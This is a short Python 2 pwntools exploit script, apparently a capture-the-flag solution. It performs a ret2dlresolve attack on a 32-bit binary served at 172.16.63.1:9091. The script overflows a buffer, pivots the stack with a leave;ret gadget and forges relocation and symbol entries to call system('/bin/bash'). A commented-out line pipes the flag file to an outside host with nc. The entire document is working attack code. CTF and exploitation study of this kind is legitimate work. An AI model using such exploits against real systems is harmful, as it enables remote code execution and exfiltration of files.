#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
code = ELF('./binary')
context.arch = code.arch
context.log_level = 'debug'
gadget = lambda x: next(code.search(asm(x, os='linux', arch=code.arch)))

r = remote('172.16.63.1', 9091)

def readn(buf, size, ret):
    return flat(
	code.plt['read'],
	ret,
	0,
	buf,
	size
    )

from hashlib import sha256
plt0 = 0x80482F0
buf = 0x804af00
leave_ret = gadget('leave; ret')
dynsym = 0x080481cc
dynstr = 0x0804822c
relplt = 0x080482b0

q = ''
q += 'A'*40
q += p32(buf)
q += readn(buf, 0x100-0x40, leave_ret)
print "size1: %d" % len(q)

index_offset = (buf+ 28) - relplt
fake_sym_addr = buf + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
r_info = (index_dynsym << 8) | 0x7
fake_reloc = p32(code.got['alarm']) + p32(r_info)
st_name = (fake_sym_addr + 0x10) - dynstr
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

p = 'A'*4
p += p32(plt0)
p += p32(index_offset)
p += 'AAAA'
p += p32(buf+80)
p += 'aaaa'
p += 'aaaa'
p += fake_reloc # (buf+28)
p += 'B' * align
p += fake_sym # (buf+36)
p += "system\x00"
p += 'A' * (80 - len(p))
p += "/bin/bash\x00"
#p += "nc 139.224.220.67 8000 < flag\x00"
p = p.ljust(0x100-0x40)
print "size2: %d" % len(p)
r.send(q + p)

r.interactive()

